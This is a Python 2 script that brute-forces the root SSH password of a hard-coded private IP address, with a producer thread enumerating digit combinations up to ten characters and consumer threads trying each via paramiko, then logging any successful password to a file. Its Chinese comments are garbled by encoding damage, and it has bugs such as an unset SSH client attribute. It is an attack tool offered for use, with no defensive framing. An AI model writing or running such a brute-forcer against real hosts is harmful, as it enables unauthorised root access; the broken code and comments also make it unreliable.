# -*- coding: utf-8 -*-
import paramiko
import os
import string
import threading
import time
import Queue

find_finish_flag = False

find_user = 'root'

##ip = '10.115.23.153'
ip = '10.115.10.244'

char_list = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~']

num_char_list = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

lower_char_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' ]

upper_char_list = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' ]

spcial_char_list = ['!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~']

##total_level_list = [num_char_list, lower_char_list, upper_char_list, spcial_char_list]
total_level_list = [num_char_list]

cur_char_list = []

q = Queue.Queue(100000)


class Producer(object):
	def __init__(self):
		print "construct Producer"

	def init_create_password(self, num, level):
		global find_finish_flag
		print "you input num =%s level = %s"%(num, level)
		#检查输入的参数是否正确�?密码的位数和 组合级别
		if num <= 0 or level <= 0 or level > len(total_level_list):
			print len(total_level_list)
			print "you input level is wrong"
			return
		##生成密码字符的组�?		for x in total_level_list:
			cur_char_list.extend(x)
			##break
		print cur_char_list
## 按照生成的位数产生密�?		for x in range(num):
			self.create_password(x+1)
			if find_finish_flag :
				break
		print "line = 53 create_password finish"
		find_finish_flag = True
	
	def create_password(self, num):
		global find_finish_flag
		pos_list = []
		## 生成记录密码各个位对应的字符表索引号
		for x in range(num):
			pos_list.append(0)
		print "line = 57 num = %s"%num
		print pos_list
		carry_num = len(cur_char_list)
		print "cur_char_list = %s\n len = %s"%(cur_char_list, len(cur_char_list))
		while True:
## 按照字符表索引号 当前的生成密�?			res = q.full()
			if res :
				time.sleep(5)
				continue
			if find_finish_flag :
				break
			str = self.merge_char(pos_list)
			q.put(str)
			##print "line = 91 str= %s, q.qsize() = %s"%(str, q.qsize())
		## 检查是否生成完当前的位数的密码
			if (self.check_finish(pos_list, carry_num-1)):
				break
			## 字符表索引号进位
			for x in range(num):
				##print "line = 66  pos_list = %s,  carry_num = %s"%(pos_list, carry_num)
				pos_list[x] += 1
				if pos_list[x] >= carry_num:
					pos_list[x] = 0
					continue
				else:
					break              
		
	## 生成密码                                        
	def merge_char(self,pos_list):
		passwd = ''
		##print "line = 74 pos_list = %s "%(pos_list)
		for x in pos_list:
			##print "line = 76 pos_list = %s "%(pos_list)
			passwd += cur_char_list[x]
			## 反序输出 索引号的高低位顺�?�?pos_list的记录顺序相�?		return passwd[::-1]

	## 检测该位数的密码是否生成完
	def check_finish(self, pos_list, carry_num):
		##print "line = 82 pos_list = %s, carry_num = %s"%(pos_list, carry_num)
		res_flag = True
		for x in pos_list:
			if x < carry_num :
				res_flag = False
				break

		return res_flag

						
class Consumer(object):
	def __init__(self):
		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		##client.connect(ip, 22, username='root', password='password', timeout=4)
		print "construct consumer"

	def check_password(self):
		global find_finish_flag
		while True:
			res = q.empty()
			if res :
				time.sleep(1)
				continue
			if find_finish_flag :
				break
			passwd = q.get()
			self.ssh_connect(ip, passwd)

	def ssh_connect(self,ip,passwd):
		global find_finish_flag
		try:
			self.client.connect(ip, 22, username=find_user, password=passwd, timeout=4)
			self.write_log(ip, password)
			print "ip: %s is login success,password is %s" % (ip,passwd)
			find_finish_flag = True
		
		except:
			##print "ip: %s passwd = %s login has no pass" % (ip, passwd)
			pass
#client.close()

	
	def write_log(self, ip_str, password):
		log_file = "find_pass.txt"
		file = open(log_file,'a')
		file.write(ip_str+'|'+password+os.linesep)
		file.close()


	
# 产生密码的线�?class PassWdThread(threading.Thread):
	def __init__(self, arg):
		super(PassWdThread, self).__init__()#注意：一定要显式的调用父类的初始化函数�?		self.arg=arg

	def run(self):#定义每个线程要运行的函数
		time.sleep(1)
		print "args = %s"%self.arg
		if self.arg == 0:
			p = Producer()
##			print dir(p)
			p.init_create_password(10, 1)
			print "line = 133"
		else:
			c = Consumer()
			c.check_password()


	
##class PassWdConsumerThread(threading.Thread):
##	def __init__(self,arg):
##		super(PassWdConsumerThread, self).__init__()#注意：一定要显式的调用父类的初始化函数�?##		self.arg=arg
##	def run(self):#定义每个线程要运行的函数
##		time.sleep(1)
##		print 'the arg is:%s\r' % self.arg


	
if __name__=='__main__':
##init_creat_password(2, 1)

	threads = []
	for i in xrange(5):
		t = PassWdThread(i)
		t.start()
		threads.append(t)
# 等待所有线程完�?	for t in threads:
		t.join()
	print "done!!!"
		        


